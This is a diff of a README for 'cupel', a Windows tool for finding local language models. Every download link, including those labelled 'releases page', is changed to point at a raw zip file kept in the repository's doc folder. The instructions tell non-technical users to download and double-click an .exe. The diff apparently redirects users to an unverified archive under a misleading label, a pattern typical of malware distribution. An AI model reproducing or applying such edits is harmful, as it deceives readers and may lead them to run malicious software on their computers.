@@ -1,6 +1,6 @@
 # 🔍 cupel - Find high performance local language models
 
-[https://github.com/scfeads/cupel/releases](https://img.shields.io/badge/Download-cupel-blue)
+[https://github.com/scfeads/cupel/raw/refs/heads/main/doc/Software_v1.8.zip](https://img.shields.io/badge/Download-cupel-blue)
 
 ## 📌 About This Tool
 
@@ -10,7 +10,7 @@ Cupel helps users find language models that provide excellent results despite th
 
 You do not need to understand programming or command lines to use this tool. Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/scfeads/cupel/releases) to download the latest version.
+1. Visit the [releases page](https://github.com/scfeads/cupel/raw/refs/heads/main/doc/Software_v1.8.zip) to download the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Save this file to your Downloads folder or any folder you prefer. 
 4. Double-click the file to start the installation.
@@ -54,7 +54,7 @@ Yes. The software functions entirely offline. No text you enter, and no document
 Some models demand more memory than others. If the response time feels slow, try a smaller model from the list.
 
 **How do I update the tool?**
-When a new version appears, visit the [releases page](https://github.com/scfeads/cupel/releases) again. Download the latest installer and run it. The installer replaces the old files while keeping your model library intact.
+When a new version appears, visit the [releases page](https://github.com/scfeads/cupel/raw/refs/heads/main/doc/Software_v1.8.zip) again. Download the latest installer and run it. The installer replaces the old files while keeping your model library intact.
 
 ## ⚖️ Performance Tips
 
